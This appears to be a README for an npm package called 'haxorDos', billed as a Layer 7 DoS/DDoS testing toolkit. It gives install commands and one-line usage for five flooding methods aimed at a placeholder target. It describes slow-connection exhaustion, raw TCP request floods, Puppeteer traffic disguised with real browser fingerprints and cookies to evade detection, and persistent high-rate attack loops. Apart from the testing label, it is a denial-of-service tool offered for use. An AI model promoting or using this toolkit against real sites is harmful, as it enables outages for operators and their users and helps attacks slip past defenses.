**A powerful Layer 7 DoS/DDoS testing toolkit built with Node.js**

</div>

---

## 📋 Overview

> *DDoS is an amplified DoS attack that uses multiple computers (botnet) simultaneously. One type targets Layer 7 (application layer), where the attack floods the application with seemingly legitimate requests (like repeatedly reloading pages), causing the server to go down due to resource exhaustion while processing them.*

---

## ✨ Features

- 🎯 **Multiple Attack Vectors** - Five different Layer 7 attack methods
- ⚡ **High Performance** - Optimized for maximum efficiency
- 🔄 **TCP Socket Support** - Raw TCP connection capabilities
- 🤖 **Browser Automation** - Stealth mode using Puppeteer
- 🔍 **Smart Reconnaissance** - Automatic target pre-scanning
- 📊 **Real-time Validation** - Connection status monitoring
- 🛡️ **Adaptive Mechanism** - Persistent attack loops

---

## 🚀 Installation

```bash
# npm install:
npm install haxorDos

# yarn install:
yarn add haxorDos 
```

---

## 📖 Quick Start

### Basic Usage

```js
const hacxorDos = require('haxorDos');

hacxorDos.SlowRiss('https://target.com', 300);
hacxorDos.netTcp('https://target.com', 300);
hacxorDos.fastDuck('https://target.com', 300);
hacxorDos.CrawlDos('https://target.com', 300);
hacxorDos.httpEndpoint('https://target.com/home/user/', 300);
```

### Import Module

```js
const hacxorDos = require('haxorDos');
```

---

## 🔧 Methods Documentation

### 1. SlowRiss

```js
hacxorDos.SlowRiss('https://target.com', 300);
```

**Description:**  
Layer 7 DoS attack that holds many HTTP connections by sending data slowly or partially, causing the server to run out of available slots.

**Parameters:**
- `target` (string): Target URL
- `intensity` (number): Attack intensity level

---

### 2. netTcp

```js
hacxorDos.netTcp('https://target.com', 300);
```

**Description:**  
Layer 7 DDoS attack that uses raw TCP sockets to establish direct network connections, then sends HTTP GET requests.

**Parameters:**
- `target` (string): Target URL
- `intensity` (number): Attack intensity level

---

### 3. fastDuck

```js
hacxorDos.fastDuck('https://target.com', 300);
```

**Description:**  
Layer 7 DoS attack named FastDuck because it combines high-speed requests with stealth techniques using browser automation (Puppeteer) to generate traffic that is technically identical to legitimate user visits, including complete browser fingerprints, valid security headers, and session cookies.

**Parameters:**
- `target` (string): Target URL
- `intensity` (number): Attack intensity level

---

### 4. CrawlDos

```js
hacxorDos.CrawlDos('https://target.com/home/user/', 300);
```

**Description:**  
Layer 7 DoS with Adaptive Persistence Mechanism that features automatic reconnaissance through target pre-scanning and continuous attack loops, combining high volume (300 requests/100ms) with real-time connectivity validation to ensure attack effectiveness even against dynamic targets.

**Parameters:**
- `target` (string): Target URL with endpoint
- `intensity` (number): Attack intensity level

---

### 5. httpEndpoint

```js
hacxorDos.httpEndpoint('https://target.com/home/user/', 300);
```

**Description:**  
Targeted endpoint attack focusing on specific application routes.

**Parameters:**
- `target` (string): Target URL with specific endpoint
- `intensity` (number): Attack intensity level
